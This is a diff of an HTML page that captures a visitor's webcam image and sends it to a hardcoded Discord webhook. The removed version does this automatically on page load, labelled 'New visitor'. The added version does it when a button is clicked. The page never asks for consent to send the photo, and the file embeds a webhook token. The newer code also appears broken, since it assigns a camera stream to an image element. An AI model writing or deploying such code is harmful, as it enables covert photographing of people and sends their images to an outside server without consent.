@@ -1,93 +1,68 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Discord Photo Notifier</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f5f5f5;
-        }
-        
-        #discord-photo {
-            width: 300px;
-            border: 1px solid #ddd;
-            padding: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        
-        img {
-            max-width: 100%;
-            height: auto;
-            margin-bottom: 10px;
-        }
-    </style>
-</head>
-<body>
-    <div id="discord-photo">
-        <img id="captured-image" src="" alt="Captured Image">
-        <p><strong>Your photo has been captured and sent to my Discord server.</strong></p>
-    </div>
-    
-    <!-- Add your Discord webhook URL below -->
+    <title>Auto Photo Capture</title>
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX';
+        function capturePhoto() {
+            // Create a new image element
+            var img = new Image();
 
-        // Capture image using navigator.mediaDevices.getUserMedia
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = stream;
-                videoElement.play();
-                
-                setTimeout(() => {
-                    captureImage(videoElement);
-                }, 3000);
-            });
+            // Set the source of the image to the user's camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    // Assign the stream to the image element
+                    img.srcObject = stream;
 
-        function captureImage(videoElement) {
-            const canvasElement = document.createElement('canvas');
-            canvasElement.width = videoElement.videoWidth;
-            canvasElement.height = videoElement.videoHeight;
-            
-            const ctx = canvasElement.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                    // Wait for the image to load
+                    img.onload = function () {
+                        // Create a canvas element
+                        var canvas = document.createElement('canvas');
+                        canvas.width = img.width;
+                        canvas.height = img.height;
 
-            const imageDataUrl = canvasElement.toDataURL('image/jpeg', 0.8);
-            document.getElementById('captured-image').src = imageDataUrl;
+                        // Draw the image onto the canvas
+                        var context = canvas.getContext('2d');
+                        context.drawImage(img, 0, 0, img.width, img.height);
 
-            sendToDiscordWebhook(imageDataUrl);
+                        // Convert the canvas image to base64 data URL
+                        var dataURL = canvas.toDataURL('image/jpeg');
+
+                        // Send the image data to the Discord webhook
+                        sendToDiscord(dataURL);
+                    };
+                })
+                .catch(function (error) {
+                    console.log('Error accessing camera:', error);
+                });
         }
 
-        function sendToDiscordWebhook(message) {
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', WEBHOOK_URL);
+        function sendToDiscord(dataURL) {
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Set the request method and URL
+            xhr.open('POST', 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX', true);
+
+            // Set the request headers
             xhr.setRequestHeader('Content-Type', 'application/json');
 
-            const payload = {
-                username: 'Photo Bot',
-                avatar_url: 'URL TO AVOID DEFAULT DISCORD ICON',
-                content: '',
-                embeds: [{
-                    description: `**New visitor:**`,
-                    color: 16777215,
-                    fields: [{
-                        name: 'Sent at',
-                        value: new Date().toString(),
-                        inline: false
-                    }],
-                    thumbnail: {
-                        url: message
+            // Set the request body
+            var payload = {
+                content: 'New user photo',
+                embeds: [
+                    {
+                        image: {
+                            url: dataURL
+                        }
                     }
-                }]
+                ]
             };
-
             xhr.send(JSON.stringify(payload));
         }
     </script>
+</head>
+<body>
+    <h1>Auto Photo Capture</h1>
+    <button onclick="capturePhoto()">Capture Photo</button>
 </body>
 </html>
